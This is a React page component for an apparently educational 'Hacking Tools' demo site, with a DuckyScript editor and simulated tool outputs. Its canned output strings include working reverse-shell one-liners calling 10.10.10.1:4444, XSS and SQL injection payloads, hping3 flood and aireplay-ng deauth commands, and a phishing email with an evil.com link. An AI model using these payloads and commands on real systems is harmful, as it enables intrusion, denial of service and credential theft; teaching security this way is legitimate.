"use client";

import { useState, useMemo, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import dynamic from "next/dynamic";
import {
  Shield, AlertTriangle, Copy, Check, Play, Pause,
  ChevronDown, Keyboard, Zap,
  Search, Download
} from "lucide-react";
import hackingToolsData from "@/data/hacking-tools.json";
import duckyPayloads from "@/data/rubber-ducky-payloads.json";
import duckyKeyboard from "@/data/duckyscript-keyboard.json";

const MonacoEditor = dynamic(() => import("@monaco-editor/react"), { ssr: false });

/* ─── Shared: CopyButton ─── */
function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
      className="p-1.5 hover:bg-white/10 rounded transition-colors"
      title="Copy to clipboard"
    >
      {copied ? <Check className="w-3.5 h-3.5 text-cyber-green" /> : <Copy className="w-3.5 h-3.5 text-gray-500" />}
    </button>
  );
}

/* ─── Terminal Output Component ─── */
function TerminalOutput({ output, color = "text-cyber-green" }: { output: string; color?: string }) {
  const endRef = useRef<HTMLDivElement>(null);
  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth" }); }, [output]);
  return (
    <div className="terminal-window h-full">
      <div className="terminal-header">
        <div className="terminal-dot bg-red-500" />
        <div className="terminal-dot bg-yellow-500" />
        <div className="terminal-dot bg-green-500" />
        <span className="text-xs text-gray-500 ml-2 font-mono">Output</span>
      </div>
      <pre className={`p-3 text-xs ${color} font-mono overflow-auto h-[calc(100%-28px)] whitespace-pre-wrap`}>
        {output}
        <div ref={endRef} />
      </pre>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════
   GENERIC TOOL PANEL — Used by 10 of 11 tools (not Rubber Ducky)
   ═══════════════════════════════════════════════════════════════ */
function GenericToolPanel({ tool }: { tool: typeof hackingToolsData.tools[number] }) {
  const [code, setCode] = useState(tool.defaultCode);
  const [output, setOutput] = useState("# Click 'Run Demo' to simulate execution\n# This is an educational demonstration");
  const lang = tool.id === "device-tracker" ? "javascript" : "python";

  const runDemo = () => {
    if (lang === "javascript") {
      try {
        const logs: string[] = [];
        const fakeConsole = {
          log: (...a: unknown[]) => logs.push(a.map(String).join(" ")),
          error: (...a: unknown[]) => logs.push(`[ERROR] ${a.map(String).join(" ")}`),
          warn: (...a: unknown[]) => logs.push(`[WARN] ${a.map(String).join(" ")}`),
        };
        const fn = new Function("console", "navigator", "screen", "window", "document", code);
        fn(fakeConsole,
          { userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", platform: "Win32", language: "en-US", languages: ["en-US"], cookieEnabled: true, doNotTrack: "1", hardwareConcurrency: 8, maxTouchPoints: 0 },
          { width: 1920, height: 1080, colorDepth: 24, availWidth: 1920, availHeight: 1040 },
          { devicePixelRatio: 1 },
          { createElement: () => ({ getContext: () => ({ textBaseline: "", font: "", fillText: () => {}, fillStyle: "", fillRect: () => {} }), toDataURL: () => "data:image/png;base64,iVBOR...fingerprint_hash_demo" }) }
        );
        setOutput(logs.join("\n") || "// No output");
      } catch (err) { setOutput(`[ERROR] ${err}`); }
    } else {
      setOutput(
        `[*] ${tool.name} — Simulation Mode\n` +
        `[*] Loaded at ${new Date().toLocaleTimeString()}\n\n` +
        `[!] ⚠  EDUCATIONAL DEMO — No real network activity\n` +
        `[*] To execute for real, copy script and run:\n` +
        `    python3 script.py\n\n` +
        `${"-".repeat(50)}\n` +
        generateFakeOutput(tool.id)
      );
    }
  };

  return (
    <div className="flex flex-col gap-3 h-[620px]">
      {/* Toolbar */}
      <div className="flex items-center justify-between px-3 py-2 glass-card">
        <div className="flex items-center gap-2">
          <span className="text-lg">{tool.icon}</span>
          <span className="text-sm font-mono text-white font-semibold">{tool.name}</span>
          <span className="text-[10px] px-2 py-0.5 rounded font-mono bg-dark-700 text-gray-400">{lang}</span>
        </div>
        <div className="flex items-center gap-2">
          <CopyButton text={code} />
          <button onClick={runDemo} className="flex items-center gap-1.5 px-4 py-1.5 text-xs font-mono rounded border transition-colors" style={{ background: `${tool.color}20`, color: tool.color, borderColor: `${tool.color}40` }}>
            <Play className="w-3.5 h-3.5" /> Run Demo
          </button>
        </div>
      </div>

      {/* Split: Editor + Output */}
      <div className="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-3 min-h-0">
        <div className="rounded-lg overflow-hidden border border-dark-600/50">
          <MonacoEditor
            height="100%"
            language={lang}
            theme="vs-dark"
            value={code}
            onChange={(v) => setCode(v || "")}
            options={{ fontSize: 12, fontFamily: "'JetBrains Mono', monospace", minimap: { enabled: false }, padding: { top: 8 }, scrollBeyondLastLine: false, wordWrap: "on", automaticLayout: true, lineNumbers: "on" }}
          />
        </div>
        <TerminalOutput output={output} color={`text-[${tool.color}]`} />
      </div>

      {/* Features */}
      <div className="flex flex-wrap gap-1.5">
        {tool.features.map((f) => (
          <span key={f} className="text-[10px] font-mono px-2 py-0.5 rounded border" style={{ color: tool.color, borderColor: `${tool.color}30`, background: `${tool.color}10` }}>{f}</span>
        ))}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   RUBBER DUCKY PANEL — Full-featured DuckyScript editor
   ═══════════════════════════════════════════════════════════ */
function RubberDuckyPanel() {
  const [code, setCode] = useState(hackingToolsData.tools.find((t) => t.id === "rubber-ducky")!.defaultCode);
  const [output, setOutput] = useState("🦆 Rubber Ducky Editor Ready\n\nSelect a payload from the dropdown or write custom DuckyScript.\nUse 'Compile' to generate binary or 'Execute' for virtual simulation.");
  const [selectedPayload, setSelectedPayload] = useState<string>("");
  const [isExecuting, setIsExecuting] = useState(false);
  const [showReference, setShowReference] = useState(false);
  const [keystrokeLog, setKeystrokeLog] = useState<string[]>([]);
  const executionRef = useRef<NodeJS.Timeout | null>(null);

  const payloadCategories = useMemo(() => {
    const categories: Record<string, typeof duckyPayloads> = {};
    duckyPayloads.forEach((p) => {
      if (!categories[p.category]) categories[p.category] = [];
      categories[p.category].push(p);
    });
    return categories;
  }, []);

  const loadPayload = (id: string) => {
    const payload = duckyPayloads.find((p) => p.id === id);
    if (payload) {
      setCode(payload.code);
      setSelectedPayload(id);
      setOutput(`[*] Loaded: ${payload.name}\n[*] Category: ${payload.category}\n[*] OS: ${payload.os}\n[*] MITRE: ${payload.mitre}\n[*] Difficulty: ${payload.difficulty}\n\n${payload.description}`);
    }
  };

  const compileToBin = () => {
    const lines = code.split("\n").filter((l) => l.trim() && !l.trim().startsWith("REM"));
    const byteArray: string[] = [];
    let byteCount = 0;

    lines.forEach((line) => {
      const trimmed = line.trim();
      if (trimmed.startsWith("STRING ")) {
        const text = trimmed.slice(7);
        text.split("").forEach((ch) => {
          const hex = duckyKeyboard.hid_char_map[ch.toLowerCase() as keyof typeof duckyKeyboard.hid_char_map] || "0x00";
          byteArray.push(hex);
          byteCount += 2;
        });
        byteArray.push("0x28"); // ENTER implicit? No, just keystroke
        byteCount++;
      } else if (trimmed.startsWith("DELAY ")) {
        const ms = parseInt(trimmed.slice(6));
        byteArray.push(`0x00 0x${Math.min(Math.floor(ms / 10), 255).toString(16).padStart(2, "0")}`);
        byteCount += 2;
      } else if (trimmed === "ENTER") {
        byteArray.push("0x00 0x28");
        byteCount += 2;
      } else if (trimmed.startsWith("GUI")) {
        byteArray.push("0x08");
        if (trimmed.length > 4) {
          const key = trimmed.slice(4).toLowerCase();
          const hex = duckyKeyboard.hid_char_map[key as keyof typeof duckyKeyboard.hid_char_map] || "0x00";
          byteArray.push(hex);
        }
        byteCount += 2;
      } else if (trimmed === "ALT y" || trimmed === "ALT Y") {
        byteArray.push("0x04 0x1C");
        byteCount += 2;
      } else if (duckyKeyboard.keys[trimmed as keyof typeof duckyKeyboard.keys]) {
        const k = duckyKeyboard.keys[trimmed as keyof typeof duckyKeyboard.keys];
        byteArray.push(`0x00 ${k.hex || "0x00"}`);
        byteCount += 2;
      }
    });

    setOutput(
      `[*] ══════ DuckyScript Compiler ══════\n` +
      `[*] Source lines: ${code.split("\n").length}\n` +
      `[*] Executable lines: ${lines.length}\n` +
      `[*] Compiled size: ${byteCount} bytes\n` +
      `[*] Output: inject.bin\n\n` +
      `═══ Binary Preview (hex) ═══\n` +
      byteArray.slice(0, 40).join(" ") +
      (byteArray.length > 40 ? `\n... (${byteArray.length - 40} more bytes)` : "") +
      `\n\n[+] inject.bin ready for USB Rubber Ducky\n[*] Flash with: dd if=inject.bin of=/dev/sdX\n[*] Or use DuckToolkit encoder`
    );
  };

  const executeVirtual = () => {
    if (isExecuting) {
      setIsExecuting(false);
      if (executionRef.current) clearTimeout(executionRef.current);
      setOutput((prev) => prev + "\n\n[!] Execution stopped by user");
      return;
    }

    setIsExecuting(true);
    setKeystrokeLog([]);
    const lines = code.split("\n");
    let lineIdx = 0;
    const logs: string[] = ["[*] ═══ Virtual Execution Started ═══", `[*] ${new Date().toLocaleTimeString()}`, ""];

    const executeLine = () => {
      if (lineIdx >= lines.length || !isExecuting) {
        logs.push("\n[*] ═══ Execution Complete ═══");
        logs.push(`[*] Total keystrokes: ${keystrokeLog.length}`);
        setOutput(logs.join("\n"));
        setIsExecuting(false);
        return;
      }

      const line = lines[lineIdx].trim();
      lineIdx++;

      if (!line || line.startsWith("REM")) {
        if (line.startsWith("REM")) logs.push(`  💬 ${line}`);
        executionRef.current = setTimeout(executeLine, 50);
        return;
      }

      if (line.startsWith("DELAY ")) {
        const ms = parseInt(line.slice(6));
        logs.push(`  ⏳ DELAY ${ms}ms`);
        setOutput(logs.join("\n"));
        executionRef.current = setTimeout(executeLine, Math.min(ms / 5, 500));
        return;
      }

      if (line.startsWith("STRING ")) {
        const text = line.slice(7);
        logs.push(`  ⌨️  TYPE: ${text.length > 60 ? text.slice(0, 60) + "..." : text}`);
        setKeystrokeLog((prev) => [...prev, ...text.split("")]);
      } else if (line === "ENTER") {
        logs.push("  ⏎ ENTER");
      } else if (line.startsWith("GUI")) {
        logs.push(`  🪟 ${line} (Windows key combo)`);
      } else if (line.startsWith("ALT")) {
        logs.push(`  ⌥  ${line}`);
      } else if (line.startsWith("CTRL")) {
        logs.push(`  ⌃  ${line}`);
      } else if (line.startsWith("SHIFT")) {
        logs.push(`  ⇧  ${line}`);
      } else {
        logs.push(`  🔑 ${line}`);
      }

      setOutput(logs.join("\n"));
      executionRef.current = setTimeout(executeLine, 80);
    };

    executeLine();
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => { if (executionRef.current) clearTimeout(executionRef.current); };
  }, []);

  return (
    <div className="flex flex-col gap-3">
      {/* Payload Selector */}
      <div className="glass-card p-3 flex flex-wrap items-center gap-3">
        <span className="text-lg">🦆</span>
        <span className="text-sm font-mono text-white font-semibold">Rubber Ducky Editor</span>

        {/* Payload Dropdown */}
        <div className="relative flex-1 min-w-[220px]">
          <select
            value={selectedPayload}
            onChange={(e) => loadPayload(e.target.value)}
            className="cyber-input text-xs pr-8 appearance-none cursor-pointer"
          >
            <option value="">— Select Payload (20 available) —</option>
            {Object.entries(payloadCategories).map(([category, payloads]) => (
              <optgroup key={category} label={`━━ ${category} ━━`}>
                {payloads.map((p) => (
                  <option key={p.id} value={p.id}>
                    [{p.os}] {p.name}
                  </option>
                ))}
              </optgroup>
            ))}
          </select>
          <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-gray-500 pointer-events-none" />
        </div>

        {/* Action Buttons */}
        <div className="flex gap-2">
          <CopyButton text={code} />
          <button onClick={compileToBin} className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono bg-yellow-500/20 text-yellow-400 rounded border border-yellow-500/30 hover:bg-yellow-500/30 transition-colors">
            <Download className="w-3.5 h-3.5" /> Compile
          </button>
          <button onClick={executeVirtual} className={`flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono rounded border transition-colors ${isExecuting ? "bg-red-500/20 text-red-400 border-red-500/30" : "bg-cyber-green/20 text-cyber-green border-cyber-green/30 hover:bg-cyber-green/30"}`}>
            {isExecuting ? <><Pause className="w-3.5 h-3.5" /> Stop</> : <><Play className="w-3.5 h-3.5" /> Execute</>}
          </button>
          <button onClick={() => setShowReference(!showReference)} className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono bg-cyber-blue/20 text-cyber-blue rounded border border-cyber-blue/30 hover:bg-cyber-blue/30 transition-colors">
            <Keyboard className="w-3.5 h-3.5" /> Reference
          </button>
        </div>
      </div>

      {/* DuckyScript Reference (collapsible) */}
      <AnimatePresence>
        {showReference && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
            <div className="glass-card p-4 max-h-[200px] overflow-y-auto">
              <h3 className="text-xs font-mono text-yellow-400 mb-2 font-bold">DuckyScript Syntax Reference</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-1">
                {duckyKeyboard.syntax_reference.map((ref) => (
                  <div key={ref.command} className="flex items-start gap-2 p-1.5 rounded hover:bg-white/5 text-[10px]">
                    <code className="text-yellow-400 font-mono font-bold shrink-0 w-20">{ref.command}</code>
                    <span className="text-gray-500">{ref.desc}</span>
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Main Editor + Output */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-3 h-[500px]">
        {/* DuckyScript Editor */}
        <div className="rounded-lg overflow-hidden border border-yellow-500/20">
          <MonacoEditor
            height="100%"
            language="plaintext"
            theme="vs-dark"
            value={code}
            onChange={(v) => setCode(v || "")}
            options={{
              fontSize: 12,
              fontFamily: "'JetBrains Mono', monospace",
              minimap: { enabled: false },
              padding: { top: 8 },
              scrollBeyondLastLine: false,
              wordWrap: "on",
              automaticLayout: true,
              lineNumbers: "on",
            }}
          />
        </div>

        {/* Output Terminal */}
        <TerminalOutput output={output} color="text-yellow-400" />
      </div>

      {/* Payload Info (when selected) */}
      {selectedPayload && (() => {
        const payload = duckyPayloads.find((p) => p.id === selectedPayload);
        if (!payload) return null;
        return (
          <div className="glass-card p-4 border-yellow-500/20">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-sm font-mono text-white font-semibold flex items-center gap-2">
                <Zap className="w-4 h-4 text-yellow-400" />
                {payload.name}
              </h3>
              <div className="flex gap-2">
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-yellow-500/10 text-yellow-400 border border-yellow-500/20">{payload.os}</span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-500/10 text-red-400 border border-red-500/20">{payload.mitre}</span>
                <span className={`text-[10px] font-mono px-2 py-0.5 rounded border ${payload.difficulty === "Hard" ? "bg-red-500/10 text-red-400 border-red-500/20" : payload.difficulty === "Medium" ? "bg-yellow-500/10 text-yellow-400 border-yellow-500/20" : "bg-green-500/10 text-green-400 border-green-500/20"}`}>{payload.difficulty}</span>
              </div>
            </div>
            <p className="text-xs text-gray-400">{payload.description}</p>
          </div>
        );
      })()}
    </div>
  );
}

/* ─── Fake output generator for non-JS tools ─── */
function generateFakeOutput(toolId: string): string {
  const outputs: Record<string, string> = {
    "ddos-sim": `[*] DDoS Simulator initialized
[*] Mode: SYN Flood (educational)
[*] Target: 127.0.0.1:80 (localhost only)

[SIMULATION] Sending packets...
  Packet #1   → SYN → 127.0.0.1:80 [64 bytes]
  Packet #2   → SYN → 127.0.0.1:80 [64 bytes]
  Packet #3   → SYN → 127.0.0.1:80 [64 bytes]
  Packet #4   → SYN → 127.0.0.1:80 [64 bytes]
  Packet #5   → SYN → 127.0.0.1:80 [64 bytes]

[*] Rate: 500 packets/sec (demo throttled)
[*] Total: 5 packets sent
[!] Real attacks use: hping3 -S --flood -p 80 target`,

    "phishing-sim": `[*] Phishing Server — Demo Mode

[*] Generated login page: http://localhost:8888/login
[*] Template: Corporate SSO Login
[*] Credential harvester: ACTIVE

[DEMO] Simulated capture:
  [+] Email: victim@company.com
  [+] Password: ******** (8 chars)
  [+] IP: 192.168.1.105
  [+] User-Agent: Chrome/120.0

[*] Redirect → https://real-company.com (legitimate site)
[*] Campaign stats: 1 credential captured`,

    "virus-maker": `=== Reverse Shell Payloads ===

[Python]
  import socket,subprocess,os
  s=socket.socket()
  s.connect(("10.10.10.1",4444))
  os.dup2(s.fileno(),0)
  subprocess.call(["/bin/sh","-i"])

[PowerShell]
  $c=New-Object Net.Sockets.TCPClient("10.10.10.1",4444)
  $s=$c.GetStream()...

[Bash]
  bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

[Base64 Encoded]
  aW1wb3J0IHNvY2tldCxzdWJw...

[*] Listener: nc -lvnp 4444`,

    "bug-finder": `[*] Bug Finder loaded with 300+ XSS payloads
[*] Target: http://testphp.vulnweb.com/search.php

=== XSS Scan ===
  [+] REFLECTED #1: <script>alert(1)</script>
  [+] REFLECTED #3: <svg/onload=alert(1)>
  [+] REFLECTED #7: <input onfocus=alert(1) autofocus>
  [-] Filtered #12: javascript:alert(1)
  [+] REFLECTED #15: <details open ontoggle=alert(1)>

  Results: 4/30 payloads reflected (13.3%)

=== SQLi Scan ===
  [+] SQL ERROR with: ' OR '1'='1
  [+] SQL ERROR with: ' UNION SELECT NULL--
  
  2 potential injection points found`,

    "vuln-scanner": `[*] Scanning: https://example.com

=== CORS Check ===
  [OK] Origin rejected: https://evil.com
  [OK] Origin rejected: null
  
=== Security Headers ===
  [OK] Strict-Transport-Security: max-age=31536000
  [MISSING] Content-Security-Policy - CSP
  [OK] X-Content-Type-Options: nosniff
  [MISSING] Permissions-Policy - Feature control
  [OK] X-Frame-Options: DENY
  [MISSING] Referrer-Policy - Referrer leakage
  
  Score: 50% (3/6 headers)
  
=== Info Disclosure ===
  [!] Server: nginx/1.18.0`,

    "ip-tracker": `=== GeoIP: 8.8.8.8 ===
  Country: United States (US)
  Region:  California
  City:    Mountain View
  ZIP:     94043
  Lat/Lon: 37.4056, -122.0775
  ISP:     Google LLC
  Org:     Google Public DNS
  AS:      AS15169 Google LLC

=== Reverse DNS ===
  Hostname: dns.google

=== WHOIS ===
  Name: GOGL
  Handle: NET-8-8-8-0-2
  CIDR: 8.8.8.0/24`,

    "pass-cracker": `[*] Test hash (MD5 of "admin"): 21232f297a57a5a743894a0e4a801fc3
[*] Type: MD5
[*] Generated wordlist: 78 words

[*] Cracking MD5: 21232f297a57a5a7...
[+] CRACKED: admin

[*] Demo complete
[*] For real cracking, use:
    hashcat -m 0 hash.txt wordlist.txt
    john --wordlist=rockyou.txt hash.txt`,

    "wifi-deauth": `[*] Scanning with wlan0mon...

BSSID                CH    PWR    ENC              SSID
----------------------------------------------------------------------
AA:BB:CC:DD:EE:01    6     -42    WPA2             HomeNetwork
AA:BB:CC:DD:EE:02    11    -55    WPA2-Enterprise  CorpWiFi
AA:BB:CC:DD:EE:03    1     -67    Open             GuestNet
AA:BB:CC:DD:EE:04    6     -71    WEP              IoT-Network

[*] Deauth attack simulation
[*] Target: HomeNetwork (AA:BB:CC:DD:EE:01)
  [1] Deauth -> CC:DD:EE:FF:42:17 (Reason: 7)
  [2] Deauth -> CC:DD:EE:FF:83:55 (Reason: 7)
  [3] Deauth -> CC:DD:EE:FF:91:28 (Reason: 7)

[*] Real command: aireplay-ng -0 10 -a AA:BB:CC:DD:EE:01 wlan0mon`,

    "social-eng": `=== Available Pretexts ===

[IT Support]
  Scenario: Call as IT helpdesk about password reset
  Props: IT badge, Helpdesk ticket number, Company jargon

[Delivery Person]
  Scenario: Physical access via delivery pretext
  Props: Uniform, Clipboard, Branded box

=== Sample Phishing Email ===
Subject: Urgent: Your password expires in 24 hours

Dear John Smith,
Your corporate password will expire in 24 hours.
Please reset immediately: https://company-reset.evil.com/auth

Best regards,
IT Security Team`,
  };
  return outputs[toolId] || "[*] Simulation complete\n[*] No real activity performed";
}

/* ═══════════════════════════════════════
   MAIN PAGE COMPONENT
   ═══════════════════════════════════════ */
export default function HackingToolsPage() {
  const [activeTool, setActiveTool] = useState("rubber-ducky");
  const [search, setSearch] = useState("");

  const tools = hackingToolsData.tools;
  const filteredTools = useMemo(() => {
    if (!search) return tools;
    return tools.filter((t) =>
      t.name.toLowerCase().includes(search.toLowerCase()) ||
      t.description.toLowerCase().includes(search.toLowerCase())
    );
  }, [search, tools]);

  const currentTool = tools.find((t) => t.id === activeTool) || tools[0];

  return (
    <div className="max-w-[1600px] mx-auto px-6 py-8 space-y-5">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold text-white flex items-center gap-3">
          <Shield className="w-7 h-7 text-red-500" />
          Hacking Tools
          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/30 animate-pulse">NEW</span>
        </h1>
        <p className="text-gray-500 text-sm mt-1 font-mono">
          11 educational security tools • Authorized pentesting only
        </p>
      </div>

      {/* Warning Banner */}
      <div className="glass-card p-4 border-red-500/30 bg-red-500/5">
        <div className="flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
          <div>
            <p className="text-sm text-red-400 font-semibold">⚠️ Authorized Penetration Testing Only</p>
            <p className="text-xs text-gray-400 mt-1">
              These tools are strictly for educational purposes and authorized security testing.
              Unauthorized use against systems you do not own or have explicit permission to test is
              <span className="text-red-400 font-semibold"> illegal and unethical</span>.
              Always obtain written permission before testing.
            </p>
          </div>
        </div>
      </div>

      {/* Tool Selector Sidebar + Content */}
      <div className="grid grid-cols-1 lg:grid-cols-[240px_1fr] gap-4">
        {/* Sidebar */}
        <div className="glass-card p-3 space-y-2 lg:max-h-[700px] lg:overflow-y-auto">
          {/* Search */}
          <div className="relative mb-2">
            <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-gray-500" />
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search tools..."
              className="w-full bg-dark-800 border border-dark-600 rounded px-3 py-1.5 pl-8 text-xs text-white font-mono focus:border-red-500/50 focus:outline-none transition-colors"
            />
          </div>

          {filteredTools.map((tool) => (
            <button
              key={tool.id}
              onClick={() => setActiveTool(tool.id)}
              className={`w-full flex items-center gap-2.5 p-2.5 rounded-lg text-left transition-all ${
                activeTool === tool.id
                  ? "bg-white/10 border border-white/10"
                  : "hover:bg-white/5 border border-transparent"
              }`}
            >
              <span className="text-base shrink-0">{tool.icon}</span>
              <div className="flex-1 min-w-0">
                <p className={`text-xs font-mono font-semibold truncate ${activeTool === tool.id ? "text-white" : "text-gray-400"}`}>
                  {tool.name}
                </p>
                <p className="text-[10px] text-gray-600 truncate">{tool.description.slice(0, 40)}...</p>
              </div>
              {tool.id === "rubber-ducky" && (
                <span className="text-[8px] font-mono px-1.5 py-0.5 rounded bg-yellow-500/20 text-yellow-400 border border-yellow-500/30 shrink-0">🦆</span>
              )}
            </button>
          ))}
        </div>

        {/* Main Content */}
        <div>
          <motion.div key={activeTool} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
            {activeTool === "rubber-ducky" ? (
              <RubberDuckyPanel />
            ) : (
              <GenericToolPanel tool={currentTool} />
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
}
